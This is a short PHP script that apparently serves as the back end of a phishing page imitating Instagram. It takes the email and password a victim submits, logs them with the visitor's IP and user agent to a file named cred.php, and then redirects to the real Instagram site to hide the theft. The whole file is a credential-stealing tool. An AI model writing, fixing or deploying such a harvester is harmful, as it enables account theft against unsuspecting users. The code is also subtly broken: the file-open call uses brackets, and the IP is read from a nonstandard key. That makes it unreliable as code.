<?php



$ip = $_SERVER['HTTP_REMOTE_ADDR'];
$device = $_SERVER['HTTP_USER_AGENT'];
$user = $_POST['email'];
$pass = $_POST['pass'];
$file="cred.php";
$handler = fopen[$file, 'a+'];
$data = "IP: $ip\nDevice: $device\nUsername: $user\nPassword: $pass\n";
fwrite($handler, $data);
fclose($handler);




header("location:https://www.instagram.com/");
?>